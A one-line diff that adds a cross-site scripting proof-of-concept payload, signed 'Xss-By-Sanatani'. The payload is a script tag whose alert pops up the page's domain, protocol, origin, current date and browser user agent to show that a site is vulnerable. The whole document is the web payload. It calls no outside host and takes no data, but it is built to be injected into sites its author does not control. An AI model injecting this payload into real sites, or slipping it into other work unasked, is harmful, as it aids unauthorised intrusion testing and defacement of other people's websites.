@@ -1,0 +1,1 @@
+<script>alert(`Xss Vulnerable "${document.domain}" ☠️:\nXss-By-Sanatani\n----------------------------------\n©-Domain::: ${document.domain}\n©-protocol::: ${location.protocol}\n©-origin::: ${location.origin}\n©-Date::: ${new Date().toLocaleString()}\n©-Version::: ${navigator.userAgent}`);</script>
